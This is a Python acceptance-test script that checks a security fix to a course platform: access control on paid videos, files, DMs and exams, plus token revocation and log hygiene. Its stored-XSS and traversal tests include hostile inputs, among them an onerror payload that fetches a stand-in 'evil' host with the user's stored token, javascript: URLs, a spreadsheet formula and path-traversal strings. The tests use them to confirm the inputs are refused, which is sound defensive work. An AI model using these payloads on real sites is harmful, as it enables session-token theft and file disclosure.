"""Acceptance checks for the security remediation. Runs against a throwaway DB."""
import os, sys, json, datetime
os.environ.setdefault("SECRET_KEY", "dummy_secret_for_import_check")

# Approve the target database before anything imports the app: `import main`
# writes to the database on import, so the guard has to come first.
from _acceptance_guard import require_scratch_database  # noqa: E402
require_scratch_database()

from fastapi.testclient import TestClient
import main
from app.database import SessionLocal, engine
from app.models import Base
from app import models as M

PASS, FAIL = [], []
def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(("  ok   " if cond else "  FAIL ") + name + (("  -> " + str(detail)) if (detail and not cond) else ""))

# Rebuild the schema from the models every run — create_all never ALTERs, so a
# stale table from a previous run would silently miss any new column.
from sqlalchemy import text as _text
with engine.begin() as _c:
    _c.execute(_text("DROP SCHEMA public CASCADE; CREATE SCHEMA public;"))
Base.metadata.create_all(bind=engine)
db = SessionLocal()

import bcrypt
def mkuser(email, active, admin=False, owner=False, name="Test User"):
    u = M.User(email=email, hashed_password=bcrypt.hashpw(b"pw", bcrypt.gensalt()).decode(),
               full_name=name, is_active=active, is_admin=admin, is_owner=owner,
               is_verified=True)
    db.add(u); db.commit(); db.refresh(u)
    return u

member  = mkuser("member@t.co", True)
free    = mkuser("free@t.co", False)
other   = mkuser("other@t.co", True)
third   = mkuser("third@t.co", True)
owner   = mkuser("owner@t.co", True, admin=True, owner=True)

c = M.Course(title="Course A", description="d", is_published=True, total_lessons=2,
             pdf_url=json.dumps([{"name":"CoursePDF","url":"/uploads/course-pdfs/c.pdf"}]))
db.add(c); db.commit(); db.refresh(c)

l1 = M.Lesson(course_id=c.id, title="L1", order=1, video_status="ready",
              vdo_video_id="VDO_SECRET_1", pdf_url=json.dumps([{"name":"P","url":"/uploads/lesson-pdfs/secret1.pdf"}]))
l2 = M.Lesson(course_id=c.id, title="L2 free", order=2, video_status="ready", is_free_preview=True,
              bunny_video_url="https://bunny/preview.m3u8")
db.add_all([l1,l2]); db.commit(); db.refresh(l1); db.refresh(l2)

from app.routers.users import create_token, issue_token_for
def tok(u):
    db.refresh(u)
    return issue_token_for(u)
def H(u): return {"Authorization": "Bearer " + tok(u)}

client = TestClient(main.app, raise_server_exceptions=False)

print("\n=== P0-1 public course endpoint ===")
r = client.get(f"/courses/{c.id}")
body = r.text
check("anon /courses/{id} 200", r.status_code == 200, r.status_code)
check("anon /courses/{id} has no vdo_video_id key", "vdo_video_id" not in body, body[:400])
check("anon /courses/{id} still offers the free preview", "preview.m3u8" in body, body[:400])
check("anon /courses/{id} has no course pdf_url key", '"pdf_url"' not in body or "secret1.pdf" not in body, body[:600])
check("anon /courses/{id} hides paid lesson video", "VDO_SECRET_1" not in body, body[:400])
check("anon /courses/{id} keeps curriculum titles", '"L1"' in body)
r = client.get("/courses")
check("anon /courses no pdf_url", "pdf_url" not in r.text, r.text[:300])

r = client.get(f"/courses/{c.id}", headers=H(free))
check("free /courses/{id} hides paid video", "VDO_SECRET_1" not in r.text, r.text[:400])
r = client.get(f"/courses/{c.id}", headers=H(member))
check("member /courses/{id} gets paid video", "VDO_SECRET_1" in r.text, r.text[:400])

r = client.get(f"/courses/{c.id}/lessons")
check("anon /courses/{id}/lessons 401", r.status_code == 401, r.status_code)
r = client.get(f"/courses/{c.id}/lessons", headers=H(member))
check("member /courses/{id}/lessons gets video", "VDO_SECRET_1" in r.text, r.text[:400])
r = client.get(f"/courses/{c.id}/lessons", headers=H(free))
check("free /courses/{id}/lessons hides paid video", "VDO_SECRET_1" not in r.text, r.text[:400])
check("free /courses/{id}/lessons keeps free preview", "preview.m3u8" in r.text, r.text[:400])


print("\n=== P0-2 protected files ===")
from pathlib import Path as _P
UP = _P("/app/uploads")
for cat in ("lesson-pdfs","course-pdfs","receipts","projects","chat","course-certificates","feedbacks","avatars"):
    (UP/cat).mkdir(parents=True, exist_ok=True)
(UP/"lesson-pdfs"/"secret1.pdf").write_bytes(b"%PDF-1.4 SECRET LESSON")
(UP/"lesson-pdfs"/"orphan.pdf").write_bytes(b"%PDF-1.4 ORPHAN")
(UP/"receipts"/"receipt_a.jpg").write_bytes(b"\xff\xd8RECEIPT")
(UP/"projects"/"proj_a.zip").write_bytes(b"PKPROJECT")
(UP/"chat"/"dm_img.png").write_bytes(b"\x89PNGCHATDM")
(UP/"avatars"/"av.png").write_bytes(b"\x89PNGAVATAR")

l1.pdf_url = json.dumps([{"name":"P","url":"/files/lesson-pdfs/secret1.pdf"}])
mpr = M.ManualPaymentRequest(receipt_url="/files/receipts/receipt_a.jpg",
                             full_name="O", email="other@t.co", phone="1", plan="monthly", amount=1)
sub = M.ProjectSubmission(user_id=other.id, course_id=c.id, file_name="p.zip",
                          file_url="/files/projects/proj_a.zip", json_payload={})
db.add_all([mpr, sub]); db.commit()

# A DM between `other` and `third`, with an attachment. `member` is not in it.
ch = M.Channel(name=f"dm_{min(other.id,third.id)}_{max(other.id,third.id)}",
               channel_type=M.ChannelType.DM)
db.add(ch); db.commit(); db.refresh(ch)
db.add_all([M.ChatMember(channel_id=ch.id, user_id=other.id),
            M.ChatMember(channel_id=ch.id, user_id=third.id)])
dm_msg = M.Message(channel_id=ch.id, sender_id=other.id, content="secret",
                   file_url="/files/chat/dm_img.png", file_name="dm_img.png")
db.add(dm_msg); db.commit()

def fget(path, u=None, cookie_user=None):
    h = H(u) if u else {}
    ck = {}
    if cookie_user is not None:
        from app.routers.users import create_file_token
        ck = {"ghawy_files": create_file_token(cookie_user.id)}
    return client.get(path, headers=h, cookies=ck)

r = fget("/files/lesson-pdfs/secret1.pdf")
check("anon /files/lesson-pdfs 401", r.status_code == 401, r.status_code)
r = fget("/files/lesson-pdfs/secret1.pdf", u=free)
check("free /files/lesson-pdfs 402/403", r.status_code in (402,403), r.status_code)
r = fget("/files/lesson-pdfs/secret1.pdf", u=member)
check("member /files/lesson-pdfs 200", r.status_code == 200, r.status_code)
check("member lesson pdf cache-control private", r.headers.get("cache-control") == "private, no-store", r.headers.get("cache-control"))
r = fget("/files/lesson-pdfs/secret1.pdf", cookie_user=member)
check("cookie-only /files/lesson-pdfs 200", r.status_code == 200, r.status_code)
r = fget("/files/lesson-pdfs/orphan.pdf", u=member)
check("member /files unreferenced file 404", r.status_code == 404, r.status_code)

r = fget("/files/receipts/receipt_a.jpg", u=member)
check("member /files/receipts 403", r.status_code == 403, r.status_code)
r = fget("/files/receipts/receipt_a.jpg", u=other)
check("receipt owner /files/receipts 200", r.status_code == 200, r.status_code)
r = fget("/files/receipts/receipt_a.jpg", u=owner)
check("owner /files/receipts 200", r.status_code == 200, r.status_code)

r = fget("/files/projects/proj_a.zip", u=member)
check("non-owner /files/projects 403", r.status_code == 403, r.status_code)
r = fget("/files/projects/proj_a.zip", u=other)
check("submitter /files/projects 200", r.status_code == 200, r.status_code)

r = fget("/files/chat/dm_img.png", u=member)
check("outsider /files/chat DM attachment 404", r.status_code == 404, r.status_code)
r = fget("/files/chat/dm_img.png", u=third)
check("DM participant /files/chat 200", r.status_code == 200, r.status_code)

r = fget("/files/avatars/av.png", u=member)
check("public category not served by /files", r.status_code == 404, r.status_code)

for bad in ("..%2F..%2Fmain.py", "..%2Freceipts%2Freceipt_a.jpg"):
    r = fget(f"/files/lesson-pdfs/{bad}", u=member)
    check(f"traversal {bad} refused", r.status_code in (403,404), r.status_code)

# The file cookie must not work as a session credential.
from app.routers.users import create_file_token
r = client.get(f"/courses/{c.id}/lessons", headers={"Authorization": "Bearer " + create_file_token(member.id)})
check("file token rejected as bearer", r.status_code == 401, r.status_code)

# StaticFiles must no longer expose protected trees.
r = client.get("/uploads/lesson-pdfs/secret1.pdf")
check("StaticFiles no longer serves lesson-pdfs", r.status_code == 404, r.status_code)
r = client.get("/uploads/avatars/av.png")
check("StaticFiles still serves avatars", r.status_code == 200, r.status_code)

# Login mints the cookie.
r = client.post("/auth/login", json={"email":"member@t.co","password":"pw"})
check("login sets file cookie", "ghawy_files" in r.headers.get("set-cookie",""), r.headers.get("set-cookie"))
check("file cookie is HttpOnly", "HttpOnly" in r.headers.get("set-cookie",""), r.headers.get("set-cookie"))


print("\n=== P1 private data between members ===")
dm_name = ch.name
r = client.get(f"/chat/messages?channel={dm_name}", headers=H(member))
check("outsider GET /chat/messages on a DM -> 404", r.status_code == 404, r.status_code)
check("outsider sees no DM bodies", "secret" not in r.text, r.text[:200])
r = client.get(f"/chat/messages?channel={dm_name}", headers=H(other))
check("participant GET /chat/messages on own DM -> 200", r.status_code == 200, r.status_code)

before = db.query(M.Channel).count()
r = client.post("/chat/messages", headers=H(member),
                json={"channel": f"dm_{other.id}_{third.id}", "content": "injected"})
check("outsider POST into a DM -> 404", r.status_code == 404, r.status_code)
r = client.post("/chat/messages", headers=H(member),
                json={"channel": "brand_new_group_xyz", "content": "hi"})
check("POST cannot auto-create a group channel", r.status_code == 404, r.status_code)
db.expire_all()
check("no channel rows created by POST", db.query(M.Channel).count() == before,
      db.query(M.Channel).count())

gen = M.Channel(name="general", channel_type=M.ChannelType.GROUP)
db.add(gen); db.commit(); db.refresh(gen)
r = client.post("/chat/messages", headers=H(member), json={"channel": "general", "content": "hello"})
check("member can still post to an open group channel", r.status_code == 201, r.status_code)
r = client.get("/chat/messages?channel=general", headers=H(member))
check("member can still read an open group channel", r.status_code == 200, r.status_code)

r = client.get(f"/profile/{other.id}/public", headers=H(member))
check("public profile hides the email local-part",
      "other" not in (r.json().get("username") or ""), r.text[:200])

ex = M.Exam(course_id=c.id, title="E1", is_published=True)
db.add(ex); db.commit(); db.refresh(ex)
r = client.get(f"/exams/{ex.id}", headers=H(free))
check("free account cannot fetch an exam", r.status_code in (402,403), r.status_code)
r = client.get(f"/courses/{c.id}/exams", headers=H(free))
check("free account cannot list exams", r.status_code in (402,403), r.status_code)
r = client.get(f"/exams/{ex.id}", headers=H(member))
check("member can still fetch an exam", r.status_code == 200, r.status_code)

import inspect
from app.services import vdocipher as _vdo
check("VdoCipher OTP carries a ttl", '"ttl": ttl' in inspect.getsource(_vdo))


print("\n=== P2 stored XSS ===")
XSS = 'x" onerror="fetch(`//evil/`+localStorage.token)" x="'
r = client.put("/profile/me", headers=H(member), json={"avatar_url": XSS})
check("PUT /profile/me rejects a markup avatar_url", r.status_code == 422, r.status_code)
r = client.put("/profile/me", headers=H(member), json={"avatar_url": "https://evil.com/x.png"})
check("PUT /profile/me rejects an off-site avatar host", r.status_code == 422, r.status_code)
r = client.put("/profile/me", headers=H(member), json={"avatar_url": "/uploads/avatars/ok.png"})
check("PUT /profile/me accepts a server-issued avatar path", r.status_code == 200, r.text[:200])
r = client.put("/profile/me", headers=H(member), json={"social_media_url": "javascript:alert(1)"})
check("PUT /profile/me rejects javascript: social url", r.status_code == 422, r.status_code)
r = client.put("/profile/me", headers=H(member), json={"social_media_url": "https://x.com/me"})
check("PUT /profile/me accepts an https social url", r.status_code == 200, r.status_code)

r = client.post("/auth/register", json={
    "first_name": "<img src=x onerror=alert(1)>", "last_name": "Hacker",
    "email": "xss1@example.com", "password": "pw123456",
    "country": "Egypt", "governorate": "Cairo"})
if r.status_code == 201:
    u = db.query(M.User).filter(M.User.email == "xss1@example.com").first()
    check("registered name stored inert", "<" not in u.full_name and ">" not in u.full_name, u.full_name)
else:
    check("markup-only name rejected at registration", r.status_code == 422, r.status_code)

r = client.post("/auth/register", json={
    "first_name": "=HYPERLINK(\"http://evil/\")", "last_name": "Tester",
    "email": "xss2@example.com", "password": "pw123456",
    "country": "Egypt", "governorate": "Cairo"})
u2 = db.query(M.User).filter(M.User.email == "xss2@example.com").first()
if u2:
    check("formula prefix stripped from stored name", not u2.full_name.startswith("="), u2.full_name)
else:
    check("formula-prefixed name handled at registration", r.status_code in (201,422), r.status_code)

# Attachments must be resolved server-side, never taken from the sender.
(UP/"chat").mkdir(parents=True, exist_ok=True)
(UP/"chat"/"fresh.png").write_bytes(b"\x89PNGFRESH")
db.add(M.ChatMember(channel_id=gen.id, user_id=member.id)); db.commit()
r = client.post("/chat/messages", headers=H(member),
                json={"channel": "general", "message_type": "image",
                      "file_url": "/files/receipts/receipt_a.jpg", "file_name": "x"})
check("attachment cannot point outside chat/", r.status_code == 422, r.status_code)
r = client.post("/chat/messages", headers=H(member),
                json={"channel": "general", "message_type": "image",
                      "file_url": "/files/chat/dm_img.png", "file_name": "x"})
check("attachment cannot claim another message's file", r.status_code == 422, r.status_code)
r = client.post("/chat/messages", headers=H(member),
                json={"channel": "general", "message_type": "image",
                      "file_url": '/files/chat/a.png" onerror="alert(1)', "file_name": "x"})
check("attachment with markup refused", r.status_code == 422, r.status_code)
r = client.post("/chat/messages", headers=H(member),
                json={"channel": "general", "message_type": "image",
                      "file_url": "/files/chat/fresh.png", "file_name": "<b>n</b>.png"})
check("a real fresh upload still attaches", r.status_code == 201, r.text[:200])
if r.status_code == 201:
    saved = db.query(M.Message).order_by(M.Message.id.desc()).first()
    check("stored file_size comes from disk", saved.file_size == len(b"\x89PNGFRESH"), saved.file_size)
    check("stored file_name has no markup", "<" not in (saved.file_name or ""), saved.file_name)

r = client.post("/chat/messages", headers=H(member),
                json={"channel": "general", "content": "z" * 9000})
if r.status_code == 201:
    saved = db.query(M.Message).order_by(M.Message.id.desc()).first()
    check("message content is capped", len(saved.content) == 4000, len(saved.content))
else:
    check("oversized message rejected", r.status_code == 422, r.status_code)


print("\n=== P3 credentials, logs, abuse ===")
import inspect
from app.routers import google_auth as _ga
ga_src = inspect.getsource(_ga)
check("OAuth callback no longer redirects with ?token=", "?token={access_token}" not in ga_src)
check("OAuth callback hands off via cookie", "set_handoff_cookie" in ga_src)

from app.routers.users import create_handoff_token, OAUTH_HANDOFF_COOKIE
r = client.post("/auth/exchange", cookies={OAUTH_HANDOFF_COOKIE: create_handoff_token(member.id)})
check("exchange swaps the hand-off cookie for a token", r.status_code == 200 and r.json().get("access_token"), r.status_code)
if r.status_code == 200:
    tok_from_exchange = r.json()["access_token"]
    r2 = client.get(f"/courses/{c.id}/lessons", headers={"Authorization": "Bearer " + tok_from_exchange})
    check("exchanged token works as a session", r2.status_code == 200, r2.status_code)
r = client.post("/auth/exchange", cookies={OAUTH_HANDOFF_COOKIE: "garbage"})
check("exchange refuses a bad hand-off cookie", r.status_code == 401, r.status_code)
r = client.post("/auth/exchange")
check("exchange refuses a missing hand-off cookie", r.status_code == 401, r.status_code)
r = client.get(f"/courses/{c.id}/lessons",
               headers={"Authorization": "Bearer " + create_handoff_token(member.id)})
check("hand-off token rejected as a session", r.status_code == 401, r.status_code)

import re as _re
users_src = inspect.getsource(__import__("app.routers.users", fromlist=["x"]))
log_calls = _re.findall(r"logger\.(?:info|debug|warning|error)\([^)]*\)", users_src)
leaky = [c for c in log_calls
         if _re.search(r"verification_code|submitted_code|otp|password", c, _re.I)]
check("no log line carries a verification code or OTP", not leaky, leaky)

import main as _m, logging as _lg
check("production log level is WARNING",
      'logging.WARNING if ENVIRONMENT == "production"' in inspect.getsource(_m).split("logging.basicConfig")[0])

# Token revocation
tok_before = tok(member)
r = client.get(f"/courses/{c.id}/lessons", headers={"Authorization": "Bearer " + tok_before})
check("token works before revocation", r.status_code == 200, r.status_code)
r = client.post("/auth/logout-all", headers={"Authorization": "Bearer " + tok_before})
check("logout-all succeeds", r.status_code == 200, r.status_code)
db.expire_all()
r = client.get(f"/courses/{c.id}/lessons", headers={"Authorization": "Bearer " + tok_before})
check("old token is dead after logout-all", r.status_code == 401, r.status_code)
db.refresh(member)
r = client.get(f"/courses/{c.id}/lessons", headers=H(member))
check("a freshly issued token still works", r.status_code == 200, r.status_code)

from app.routers.admin import _csv_safe
check("CSV formula prefix neutralized", _csv_safe('=HYPERLINK("x")').startswith("'"), _csv_safe('=X'))
check("CSV leaves ordinary text alone", _csv_safe("Ali Hassan") == "Ali Hassan")


print("\n=== P4 hardening ===")
r = client.post(f"/courses/{c.id}/lessons/{l1.id}/complete", headers=H(free))
check("free account cannot complete a lesson", r.status_code in (401,402,403), r.status_code)
r = client.post(f"/courses/{c.id}/lessons/{l1.id}/complete", headers=H(member))
check("member cannot complete an unwatched vdo lesson", r.status_code == 409, r.status_code)
from app.models import LessonPlaybackGrant
db.add(LessonPlaybackGrant(user_id=member.id, lesson_id=l1.id)); db.commit()
r = client.post(f"/courses/{c.id}/lessons/{l1.id}/complete", headers=H(member))
check("member CAN complete after playback is recorded", r.status_code == 200, r.text[:150])
r = client.post(f"/courses/{c.id}/lessons/{l2.id}/complete", headers=H(member))
check("non-vdo lesson still completes (no evidence to require)", r.status_code == 200, r.text[:150])

import inspect
from app.routers import google_auth as _ga2
check("dead invite endpoints removed",
      "register-with-invite" not in inspect.getsource(_ga2).split("# The invite-token flow")[0])
check("Google sign-in checks email_verified", "email_verified" in inspect.getsource(_ga2))

routes = [r.path for r in main.app.routes]
# /manual-payments/{id}/resend-invite is a different thing and stays: it mails
# a plain login link and never touches invite_token.
dead = [p for p in routes if p.startswith("/auth/invite") or "register-with-invite" in p]
check("the auth invite-token routes are gone", not dead, dead)

from app.routers.ws import _within_send_rate, SEND_RATE_LIMIT
burst = [_within_send_rate(999) for _ in range(SEND_RATE_LIMIT + 5)]
check("chat send rate limit engages", burst[0] is True and burst[-1] is False, burst[-3:])

from app.routers.courses import _uploads_path_for
check("PDF delete refuses traversal", _uploads_path_for("/uploads/../../etc/passwd") is None)
check("PDF delete resolves a real upload", str(_uploads_path_for("/files/lesson-pdfs/x.pdf") or "").endswith("uploads/lesson-pdfs/x.pdf"))

print(f"\n{len(PASS)} passed, {len(FAIL)} failed")
if FAIL:
    print("FAILED:", FAIL); sys.exit(1)
